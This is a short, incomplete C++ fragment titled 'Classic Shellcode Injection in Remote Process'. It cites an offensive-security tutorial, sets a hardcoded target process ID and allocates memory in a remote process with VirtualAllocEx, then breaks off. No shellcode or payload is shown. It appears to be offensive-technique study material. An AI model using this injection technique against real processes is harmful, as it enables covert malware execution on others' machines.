/*
Title: Classic Shellcode Injection in Remote Process
Resources:
	- https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
*/
#include <Windows.h>

BOOL ClassicShellcodeInjectionRemote() {
	DWORD dwPid = 1234; // Replace it with the target PID.
	...
	LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!lpRemoteBuffer) {
